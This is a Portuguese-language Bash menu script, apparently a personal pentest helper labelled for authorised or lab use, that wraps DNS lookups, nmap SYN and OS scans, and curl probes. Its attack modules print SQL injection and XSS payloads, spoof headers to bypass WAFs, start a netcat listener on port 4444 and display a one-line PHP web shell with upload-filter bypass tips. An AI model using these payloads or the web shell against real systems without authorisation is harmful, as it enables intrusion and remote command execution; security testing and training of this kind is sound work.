#!/bin/bash

# ==============================================================================
# SCRIPT: SADI - MIDDLE
# AUTOR: Manuel Sadi Kufika
# DESCRIÇÃO: Framework Modular de Reconhecimento, Enumeração e Análise Web
# AVISO: Utilize apenas em ambientes autorizados e para fins educacionais/lab.
# ==============================================================================

RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
NC="\033[0m" # Sem cor

banner() {
    clear
    echo -e "${CYAN}"
    if command -v figlet &> /dev/null; then
        figlet -f slant "SADI - MIDDLE"
    else
        echo "====================================================="
        echo "                 SADI - MIDDLE                       "
        echo "====================================================="
    fi
    echo -e "${NC}"
    echo -e "${GREEN}      Criado por: Manuel Sadi Kufika                 ${NC}"
    echo -e "${CYAN}====================================================${NC}"
}

pausa() {
    echo -e "\n${YELLOW}[Pressione Enter para retornar ao menu principal]${NC}"
    read
}

while true; do
    banner
    echo -e "${YELLOW}[+] MENU PRINCIPAL:${NC}"
    echo " 1. Footprinting, IP & Consulta / Enumeração DNS"
    echo " 2. Verificação de Hosts Ativos & Scan Furtivo (TCP/UDP/SO)"
    echo " 3. Enumeração de Serviços & Análise Web (Directory Listing / Tech)"
    echo " 4. Testes Web Avançados (SQLi Union/Error, WAF Bypass, Cookies, XSS)"
    echo " 5. Utilitários (Descriptografia MD5, Servidor Externo, Shell Upload Helper)"
    echo " 0. Sair"
    echo -e "${CYAN}====================================================${NC}"
    read -p "Escolha uma opção: " opcao

    case $opcao in
        1)
            clear
            echo -e "${BLUE}=== 1. FOOTPRINTING & DNS ===${NC}"
            read -p "Digite o Alvo (ex: exemplo.com ou IP): " alvo
            
            echo -e "\n${GREEN}[*] Obtendo IP e Registo do Alvo...${NC}"
            host "$alvo" 2>/dev/null || nslookup "$alvo"
            
            echo -e "\n${GREEN}[*] Consulta DNS Avançada & Subdomínios básicos (dig)...${NC}"
            dig "$alvo" any +noall +answer 2>/dev/null || echo "Ferramenta dig indisponível."
            
            pausa
            ;;
        2)
            clear
            echo -e "${BLUE}=== 2. VARREDURA DE REDE & HOSTS ATIVOS ===${NC}"
            read -p "Digite o IP ou Domínio Alvo: " alvo
            
            echo -e "\n${GREEN}[*] Verificando Hosts Ativos (Ping Sweep)...${NC}"
            ping -c 3 "$alvo"
            
            echo -e "\n${GREEN}[*] Identificando SO e Executando Scan Furtivo (SYN Scan)...${NC}"
            if command -v nmap &> /dev/null; then
                sudo nmap -sS -O -T4 "$alvo"
            else
                echo "Nmap não instalado. Instale o nmap para continuar."
            fi
            
            pausa
            ;;
        3)
            clear
            echo -e "${BLUE}=== 3. ENUMERAÇÃO DE SERVIÇOS & ANÁLISE WEB ===${NC}"
            read -p "Digite o URL ou IP do Alvo (ex: http://alvo.com): " alvo_web
            
            echo -e "\n${GREEN}[*] Analisando Linguagem, Informações & Directory Listing (cURL Headers)...${NC}"
            curl -I -s "$alvo_web"
            
            echo -e "\n${GREEN}[*] Verificando Information Disclosure com cabeçalhos comuns...${NC}"
            curl -s -I -H "User-Agent: Mozilla/5.0" "$alvo_web"
            
            pausa
            ;;
        4)
            clear
            echo -e "${BLUE}=== 4. TESTES WEB AVANÇADOS ===${NC}"
            echo "1. Simular WAF Bypass (Headers personalizados)"
            echo "2. Verificar injeção SQL (Union/Error Based - Conceitual)"
            echo "3. Testar com Cookies de Acesso"
            echo "4. Teste básico de XSS (Cross Site Scripting)"
            read -p "Escolha o sub-módulo: " subop

            case $subop in
                1)
                    read -p "URL Alvo: " url
                    echo -e "${GREEN}[*] Enviando requisição com Headers de evasão/WAF Bypass...${NC}"
                    curl -s -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" "$url" | head -n 30
                    ;;
                2)
                    echo -e "${YELLOW}[!] Dica para SQLi (Union/Error Based):${NC}"
                    echo "Utilize payloads como: ' OR 1=1 -- ou UNION SELECT null,null,null --"
                    echo "Podes integrar ferramentas como sqlmap: sqlmap -u \"$url?id=1\" --batch"
                    ;;
                3)
                    read -p "URL Alvo: " url
                    read -p "String de Cookies (ex: session=xyz123): " cook
                    echo -e "${GREEN}[*] Acedendo com Cookies...${NC}"
                    curl -s -b "$cook" "$url"
                    ;;
                4)
                    read -p "URL Alvo vulnerável a parâmetro GET (ex: http://site.com/page.php?search=): " url_xss
                    payload="<script>alert(1)</script>"
                    echo -e "${GREEN}[*] Testando payload XSS: ${payload}${NC}"
                    curl -s "${url_xss}${payload}" | grep -i "<script>" && echo -e "${RED}[!] Possível XSS refletido detetado!${NC}" || echo "Nenhum sinal direto detetado."
                    ;;
            esac
            pausa
            ;;
        5)
            clear
            echo -e "${BLUE}=== 5. UTILITÁRIOS & PÓS-EXPLORAÇÃO ===${NC}"
            echo "1. Descriptografar / Consultar Hash MD5 (Wordlist local ou API online)"
            echo "2. Criar Servidor Externo (Python HTTP / Netcat Listener)"
            echo "3. Gerar/Verificar Shell Upload Helper"
            read -p "Escolha o utilitário: " utilop

            case $utilop in
                1)
                    read -p "Introduza a hash MD5: " hashmd5
                    echo -e "${GREEN}[*] Consultando bases de dados públicas para a hash: $hashmd5${NC}"
                    curl -s "https://api.hashify.net/hash/md5/hex?text=$hashmd5" 2>/dev/null || echo "Consulta indisponível."
                    echo -e "\nOu use localmente com wordlist: hashcat -m 0 -a 0 '$hashmd5' /path/wordlist.txt"
                    ;;
                2)
                    echo "1. Servidor HTTP Python (Porta 8080)"
                    echo "2. Listener Netcat (Porta 4444)"
                    read -p "Escolha: " servop
                    if [ "$servop" = "1" ]; then
                        echo -e "${GREEN}[*] A iniciar Servidor HTTP em Python...${NC}"
                        python3 -m http.server 8080
                    elif [ "$servop" = "2" ]; then
                        echo -e "${GREEN}[*] A escutar na porta 4444 com Netcat...${NC}"
                        nc -lvnp 4444
                    fi
                    ;;
                3)
                    echo -e "${YELLOW}[!] Shell Upload Helper:${NC}"
                    echo "Certifique-se de validar extensões perigosas (.php, .phtml, .phar) e bypass de Content-Type (ex: image/jpeg)."
                    echo "Exemplo de payload simples web shell em PHP:"
                    echo -e "${CYAN}<?php echo system(\$_GET['cmd']); ?>${NC}"
                    ;;
            esac
            pausa
            ;;
        0)
            echo -e "${GREEN}A sair do SADI - MIDDLE. Até breve, Manuel!${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Opção inválida!${NC}"
            sleep 1
            ;;
    esac
done
